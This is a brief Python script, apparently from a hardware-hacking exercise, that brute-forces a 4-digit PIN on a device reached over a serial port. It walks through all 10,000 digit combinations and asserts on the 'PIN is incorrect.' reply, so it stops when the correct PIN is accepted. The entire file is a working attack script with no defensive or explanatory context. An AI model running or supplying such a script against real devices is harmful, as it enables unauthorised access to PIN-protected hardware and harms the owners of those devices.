import serial, sys
from time import sleep
from itertools import product

def bruteforce(dev):
    with serial.Serial(dev, 115200, timeout=1) as ser:
        pins = list(product(b'1234567890', repeat=4))
        count = len(pins)
        i = 0
        for pin in pins:
            print(pin, ' ', i/count)
            i += 1
            ser.write(b'A')
            s = ser.read(21)
            assert s.decode() == 'Please enter the PIN:', 'Expected "Please enter the PIN", but read "%s"' % s.decode()
            ser.write(pin)
            s = ser.read(23)
            assert s == b'\x00\r\nPIN is incorrect.\r\n\x00', 'On PIN %s, it responded %s' % (pin, s)

if __name__ == '__main__':
    bruteforce(sys.argv[1])


